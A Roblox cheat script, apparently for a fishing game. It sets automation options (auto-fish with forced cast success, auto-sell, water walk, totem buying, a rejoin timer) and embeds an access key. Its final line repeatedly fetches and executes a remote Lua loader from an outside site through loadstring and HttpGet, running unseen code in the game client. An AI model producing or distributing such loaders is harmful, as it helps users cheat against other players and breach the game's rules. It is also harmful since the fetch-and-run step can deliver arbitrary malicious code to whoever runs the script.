repeat task.wait() until game:IsLoaded()
game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
getgenv().Config = {
	["Inventory"] = {
		["Auto Favourite"] = {
			["Weight"] = 1000,
			["Enable"] = true,
			["Unfavourite if unmatch"] = true
		},
		["Auto Sell"] = {
			["Enable"] = true,
			["Delay"] = 3,
			["Rarity"] = {
				["Legendary"] = true
			}
		}
	},
	["AutoSave"] = true,
	["Auto Fish"] = {
		["Fish Location"] = {
			["Postion"] = "-1827.72595, -140.391846, -3431.39282, 0.379164636, -0.00860293955, 0.925289154, 1.90935641e-08, 0.999956667, 0.00929721631, -0.925329149, -0.00352513604, 0.379148275",
			["Manual"] = true,
			["Height"] = 10
		},
		["Cast Threshold"] = 95,
		["Enable"] = true,
		["Perfect Chance"] = 50,
		["Fail Chance"] = 0
	},
	["Character"] = {
		["Water Walk"] = true,
		["Disable Swim"] = true
	},
	["Performance"] = {
		["Fullbright"] = true,
		["Boost FPS"] = true
	},
	["Auto Aurora Totem"] = {
		["Use Sundial if Day"] = true,
		["Buy Aurora Rod"] = true,
		["Enable"] = true
	},
	["Performance Failsafe"] = {
		["Rejoin Timer"] = {
			["Minute"] = 60
		}
	}
}
getgenv().Key = "wPfsNXRRMazroqcwmxPIUwPcGvwkRZer"
repeat wait(2)spawn(function()loadstring(game:HttpGet("https://nousigi.com/loader.lua"))()end)wait(6)until Joebiden